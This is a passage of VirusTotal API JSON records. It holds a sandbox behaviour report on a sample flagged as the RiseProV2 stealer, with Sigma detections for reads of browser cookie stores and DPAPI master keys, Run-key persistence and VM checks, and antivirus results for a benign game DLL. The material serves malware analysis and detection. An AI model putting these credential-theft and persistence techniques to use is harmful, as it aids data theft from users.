          "rule_description": "It is extremely abnormal for svchost.exe to spawn without any CLI arguments and is normally observed when a malicious process spawns the process and injects code into the process memory space.",
          "rule_author": "David Burkett, @signalblur"
        },
        {
          "match_context": [
            {
              "values": {
                "query": "db-ip.com"
              }
            },
            {
              "values": {
                "query": "ipinfo.io"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "3a2766a08d32a855b604a786cddc0f76fee13e6ccd22e01d4878150f0ef1eebc",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Suspicious DNS Query for IP Lookup Service APIs",
          "rule_description": "Detects DNS queries for IP lookup services such as \"api.ipify.org\" originating from a non browser process.",
          "rule_author": "Brandon George (blog post), Thomas Patzke"
        },
        {
          "match_context": [
            {
              "values": {
                "FileName": "%APPDATA%\\mozilla\\firefox\\profiles\\yfwt7ezn.default-release-1\\cookies.sqlite"
              }
            },
            {
              "values": {
                "FileName": "%APPDATA%\\mozilla\\firefox\\profiles\\0j9e9tku.default-release\\cookies.sqlite"
              }
            },
            {
              "values": {
                "FileName": "%APPDATA%\\thunderbird\\profiles\\npsdfqy3.default-release\\cookies.sqlite"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "74ea3fde96df11352e7b3c70bce437f83f170b5677efeb447c7f33d001142691",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Access To Browser Credential Files By Uncommon Application",
          "rule_description": "Detects file access requests to browser credential stores by uncommon processes.\nCould indicate potential attempt of credential stealing.\nRequires heavy baselining before usage\n",
          "rule_author": "frack113"
        },
        {
          "match_context": [
            {
              "values": {
                "DestinationHostname": "ipinfo.io",
                "Initiated": "true",
                "DestinationPort": "443",
                "DestinationIp": "34.117.186.192"
              }
            },
            {
              "values": {
                "DestinationHostname": "db-ip.com",
                "DestinationPort": "443",
                "DestinationIp": "104.26.4.15",
                "Initiated": "true"
              }
            },
            {
              "values": {
                "DestinationHostname": "db-ip.com",
                "Initiated": "true",
                "DestinationPort": "443",
                "DestinationIp": "104.26.5.15"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "7b06f86400ae084ca05c7e2cefe70b8ea4910b6196d969ae516b9d5d1c99bfe5",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Suspicious Network Connection to IP Lookup Service APIs",
          "rule_description": "Detects external IP address lookups by non-browser processes via services such as \"api.ipify.org\". This could be indicative of potential post compromise internet test activity.",
          "rule_author": "Janantha Marasinghe, Nasreddine Bencherchali (Nextron Systems)"
        },
        {
          "match_context": [
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "%LOCALAPPDATA%\\RageMP131\\RageMP131.exe",
                "TargetObject": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RageMP131"
              }
            },
            {
              "values": {
                "EventID": "13",
                "EventType": "SetValue",
                "Details": "%LOCALAPPDATA%\\RageMP131\\RageMP131.exe",
                "TargetObject": "HKU\\S-1-5-21-575823232-3065301323-1442773979-1000\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RageMP131"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "8b5db9da5732dc549b0e8b56fe5933d7c95ed760f3ac20568ab95347ef8c5bcc",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "CurrentVersion Autorun Keys Modification",
          "rule_description": "Detects modification of autostart extensibility point (ASEP) in registry.",
          "rule_author": "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)"
        },
        {
          "match_context": [
            {
              "values": {
                "FileName": "%WINDIR%\\system32\\microsoft\\protect\\s-1-5-18\\user\\preferred"
              }
            },
            {
              "values": {
                "FileName": "%APPDATA%\\microsoft\\protect\\s-1-5-21-1238866942-1249195528-555854008-1000\\preferred"
              }
            }
          ],
          "rule_level": "medium",
          "rule_id": "ec1d4770fddf21948d437ee8ade88904c7b95601bf83cfe214687e2611dd530c",
          "rule_source": "Sigma Integrated Rule Set (GitHub)",
          "rule_title": "Access To Windows DPAPI Master Keys By Uncommon Application",
          "rule_description": "Detects file access requests to the the Windows Data Protection API Master keys by an uncommon application.\nThis can be a sign of credential stealing. Example case would be usage of mimikatz \"dpapi::masterkey\" function\n",
          "rule_author": "Nasreddine Bencherchali (Nextron Systems)"
        }
      ],
      "ssdeep": "49152:drFYck+KPJgiMxnrYkUXI2V3+I4EN2zPeBuFg2xQri1xOHd8GHhVyxl+dvwRX:ZFYL+KJSxnrqXDV3r2zr1xOyGHhAx0vC",
      "sandbox_verdicts": {
        "VMRay": {
          "category": "malicious",
          "sandbox_name": "VMRay",
          "malware_classification": [
            "MALWARE"
          ],
          "malware_names": [
            "Mal/HTMLGen-A"
          ]
        },
        "C2AE": {
          "category": "malicious",
          "confidence": 70,
          "sandbox_name": "C2AE",
          "malware_classification": [
            "STEALER"
          ],
          "malware_names": [
            "RiseProV2"
          ]
        },
        "Dr.Web vxCube": {
          "category": "malicious",
          "sandbox_name": "Dr.Web vxCube",
          "malware_classification": [
            "MALWARE",
            "EVADER"
          ]
        },
        "Yomi Hunter": {
          "category": "malicious",
          "sandbox_name": "Yomi Hunter",
          "malware_classification": [
            "MALWARE"
          ]
        }
      },
      "size": 2365440,
      "last_analysis_date": 1706728780,
      "unique_sources": 3
    }
  },
  "mitre": {
    "data": {
      "VMRay": {
        "tactics": [
          {
            "id": "TA0005",
            "name": "Defense Evasion",
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/",
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "(Process #1) securiteinfo.com.win32.trojanx-gen.22839.19899.exe is possibly trying to detect a VM via rdtsc."
                  }
                ]
              },
              {
                "id": "T1027",
                "name": "Obfuscated Files or Information",
                "link": "https://attack.mitre.org/techniques/T1027/",
                "description": "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \nPayloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.  Adversaries may also use compressed or archived scripts, such as JavaScript. \nPortions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.  Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled. \nAdversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.   ",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "Modifies exception handler (e.g., the instruction pointer is modified within an exception handler filter)."
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0007",
            "name": "Discovery",
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "id": "T1497",
                "name": "Virtualization/Sandbox Evasion",
                "link": "https://attack.mitre.org/techniques/T1497/",
                "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "(Process #1) securiteinfo.com.win32.trojanx-gen.22839.19899.exe is possibly trying to detect a VM via rdtsc."
                  }
                ]
              },
              {
                "id": "T1012",
                "name": "Query Registry",
                "link": "https://attack.mitre.org/techniques/T1012/",
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "(Process #1) securiteinfo.com.win32.trojanx-gen.22839.19899.exe reads out system information, commonly used to detect \"VirtualBox\" via registry. (Key is \"HKEY_LOCAL_MACHINE\\HARDWARE\\ACPI\\DSDT\\VBOX__\")."
                  }
                ]
              },
              {
                "id": "T1010",
                "name": "Application Window Discovery",
                "link": "https://attack.mitre.org/techniques/T1010/",
                "description": "Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used. For example, information about application windows could be used identify potential data to collect as well as identifying security tooling (Security Software Discovery) to evade.\nAdversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "(Process #6) mpgph131.exe tries to detect debugger by checking for existence of window class \"OLLYDBG\"."
                  }
                ]
              },
              {
                "id": "T1057",
                "name": "Process Discovery",
                "link": "https://attack.mitre.org/techniques/T1057/",
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "INFO",
                    "description": "(Process #6) mpgph131.exe enumerates running processes."
                  }
                ]
              },
              {
                "id": "T1124",
                "name": "System Time Discovery",
                "link": "https://attack.mitre.org/techniques/T1124/",
                "description": "An adversary may gather the system time and/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. \nSystem time information may be gathered in a number of ways, such as with Net on Windows by performing net time \\hostname to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using w32tm /tz.\nOn network devices, Network Device CLI commands such as show clock detail can be used to see the current time configuration.\nThis information could be useful for performing other techniques, such as executing a file with a Scheduled Task/Job, or to discover locality information based on time zone to assist in victim targeting (i.e. System Location Discovery). Adversaries may also use knowledge of system time as part of a time bomb, or delaying execution until a specified date/time.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "(Process #1) securiteinfo.com.win32.trojanx-gen.22839.19899.exe is possibly trying to detect a VM via rdtsc."
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0002",
            "name": "Execution",
            "link": "https://attack.mitre.org/tactics/TA0002/",
            "description": "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "techniques": [
              {
                "id": "T1053",
                "name": "Scheduled Task/Job",
                "link": "https://attack.mitre.org/techniques/T1053/",
                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Schedules task \"MPGPH131 HR\" via the schtasks command line utility."
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0003",
            "name": "Persistence",
            "link": "https://attack.mitre.org/tactics/TA0003/",
            "description": "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "techniques": [
              {
                "id": "T1053",
                "name": "Scheduled Task/Job",
                "link": "https://attack.mitre.org/techniques/T1053/",
                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Schedules task \"MPGPH131 HR\" via the schtasks command line utility."
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0004",
            "name": "Privilege Escalation",
            "link": "https://attack.mitre.org/tactics/TA0004/",
            "description": "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "techniques": [
              {
                "id": "T1053",
                "name": "Scheduled Task/Job",
                "link": "https://attack.mitre.org/techniques/T1053/",
                "description": "Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.\nAdversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to System Binary Proxy Execution, adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.",
                "signatures": [
                  {
                    "severity": "LOW",
                    "description": "Schedules task \"MPGPH131 HR\" via the schtasks command line utility."
                  }
                ]
              }
            ]
          }
        ]
      },
      "Yomi Hunter": {
        "tactics": [
          {
            "id": "TA0005",
            "name": "Defense Evasion",
            "link": "https://attack.mitre.org/tactics/TA0005/",
            "description": "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "techniques": [
              {
                "id": "T1497.001",
                "name": "System Checks",
                "link": "https://attack.mitre.org/techniques/T1497/001/",
                "description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Detected an attempt to hide a thread from the debugger using the NtSetInformationThread function"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0007",
            "name": "Discovery",
            "link": "https://attack.mitre.org/tactics/TA0007/",
            "description": "The adversary is trying to figure out your environment.\n\nDiscovery consists of techniques an adversary may use to gain knowledge about the system and internal network. These techniques help adversaries observe the environment and orient themselves before deciding how to act. They also allow adversaries to explore what they can control and what’s around their entry point in order to discover how it could benefit their current objective. Native operating system tools are often used toward this post-compromise information-gathering objective. ",
            "techniques": [
              {
                "id": "T1497.001",
                "name": "System Checks",
                "link": "https://attack.mitre.org/techniques/T1497/001/",
                "description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors.\nSpecific checks will vary based on the target and/or adversary, but may involve behaviors such as Windows Management Instrumentation, PowerShell, System Information Discovery, and Query Registry to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment. \nChecks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. \nOther common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions. In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output. \nHardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "Detected an attempt to hide a thread from the debugger using the NtSetInformationThread function"
                  }
                ]
              },
              {
                "id": "T1057",
                "name": "Process Discovery",
                "link": "https://attack.mitre.org/techniques/T1057/",
                "description": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from Process Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nIn Windows environments, adversaries could obtain details on running processes using the Tasklist utility via cmd or Get-Process via PowerShell. Information about processes can also be extracted from the output of Native API calls such as CreateToolhelp32Snapshot. In Mac and Linux, this is accomplished with the ps command. Adversaries may also opt to enumerate processes via /proc.\nOn network devices, Network Device CLI commands such as show processes can be used to display current running processes.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process may have looked for a particular process running on the system"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "The process attempted to detect a running debugger using common APIs"
                  }
                ]
              },
              {
                "id": "T1082",
                "name": "System Information Discovery",
                "link": "https://attack.mitre.org/techniques/T1082/",
                "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from System Information Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\nTools such as Systeminfo can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the systemsetup configuration tool on macOS. As an example, adversaries with user-level access can execute the df -aH command to obtain currently mounted disks and associated freely available space. Adversaries may also leverage a Network Device CLI on network devices to gather detailed system information (e.g. show version). System Information Discovery combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process has tried to retrieve the BIOS version (maybe for checking the virtualization presence)"
                  }
                ]
              },
              {
                "id": "T1012",
                "name": "Query Registry",
                "link": "https://attack.mitre.org/techniques/T1012/",
                "description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security. Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process has tried to retrieve the BIOS version (maybe for checking the virtualization presence)"
                  }
                ]
              }
            ]
          },
          {
            "id": "TA0009",
            "name": "Collection",
            "link": "https://attack.mitre.org/tactics/TA0009/",
            "description": "The adversary is trying to gather data of interest to their goal.\n\nCollection consists of techniques adversaries may use to gather information and the sources information is collected from that are relevant to following through on the adversary's objectives. Frequently, the next goal after collecting data is to steal (exfiltrate) the data. Common target sources include various drive types, browsers, audio, video, and email. Common collection methods include capturing screenshots and keyboard input.",
            "techniques": [
              {
                "id": "T1119",
                "name": "Automated Collection",
                "link": "https://attack.mitre.org/techniques/T1119/",
                "description": "Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. This functionality could also be built into remote access tools. \nThis technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments.",
                "signatures": [
                  {
                    "severity": "UNKNOWN",
                    "description": "The process tried to detect the presence of common debug and forensic utilities"
                  },
                  {
                    "severity": "UNKNOWN",
                    "description": "The process attempted to detect debuggers and common forensic/analysis tools looking for known devices"
                  }
                ]
              }
            ]
          }
        ]
      }
    },
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/5cf41546232059b45ae02f5aacccf38e7efd99e122414dbeceea2a85b16a38c1/behaviour_mitre_trees"
    }
  }
},
{
  "_id": {
    "$oid": "65bac8700e994d74c761c8f3"
  },
  "data": {
    "id": "4167b599f36af0781b81563bd2179a6d35daa3145f0b6f99ac6d9ee1894b516a",
    "type": "file",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/4167b599f36af0781b81563bd2179a6d35daa3145f0b6f99ac6d9ee1894b516a"
    },
    "attributes": {
      "md5": "5c677eba3a7a05c0bc22288198c19383",
      "known_distributors": {
        "distributors": [
          "Microsoft",
          "Team Cherry"
        ],
        "filenames": [
          "zlib.net.dll"
        ],
        "products": [
          "Hollow Knight"
        ],
        "data_sources": [
          "Microsoft Corporation",
          "National Software Reference Library (NSRL)"
        ]
      },
      "sha256": "4167b599f36af0781b81563bd2179a6d35daa3145f0b6f99ac6d9ee1894b516a",
      "last_analysis_results": {
        "Bkav": {
          "method": "blacklist",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Lionic": {
          "method": "blacklist",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Elastic": {
          "method": "blacklist",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "engine_update": "20240115",
          "category": "undetected",
          "result": null
        },
        "MicroWorld-eScan": {
          "method": "blacklist",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "FireEye": {
          "method": "blacklist",
          "engine_name": "FireEye",
          "engine_version": "35.47.0.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "CAT-QuickHeal": {
          "method": "blacklist",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "engine_update": "20240130",
          "category": "undetected",
          "result": null
        },
        "Skyhigh": {
          "method": "blacklist",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "McAfee": {
          "method": "blacklist",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Malwarebytes": {
          "method": "blacklist",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Zillya": {
          "method": "blacklist",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5043",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Sangfor": {
          "method": "blacklist",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "engine_update": "20240129",
          "category": "undetected",
          "result": null
        },
        "K7AntiVirus": {
          "method": "blacklist",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.139.50921",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Alibaba": {
          "method": "blacklist",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "engine_update": "20190527",
          "category": "undetected",
          "result": null
        },
        "K7GW": {
          "method": "blacklist",
          "engine_name": "K7GW",
          "engine_version": "12.139.50921",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "BitDefenderTheta": {
          "method": "blacklist",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "engine_update": "20240103",
          "category": "undetected",
          "result": null
        },
        "VirIT": {
          "method": "blacklist",
          "engine_name": "VirIT",
          "engine_version": "9.5.630",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Symantec": {
          "method": "blacklist",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "tehtris": {
          "method": "blacklist",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "ESET-NOD32": {
          "method": "blacklist",
          "engine_name": "ESET-NOD32",
          "engine_version": "28661",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "APEX": {
          "method": "blacklist",
          "engine_name": "APEX",
          "engine_version": "6.495",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Paloalto": {
          "method": "blacklist",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "ClamAV": {
          "method": "blacklist",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Kaspersky": {
          "method": "blacklist",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "BitDefender": {
          "method": "blacklist",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "NANO-Antivirus": {
          "method": "blacklist",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "SUPERAntiSpyware": {
          "method": "blacklist",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Avast": {
          "method": "blacklist",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Emsisoft": {
          "method": "blacklist",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Baidu": {
          "method": "blacklist",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
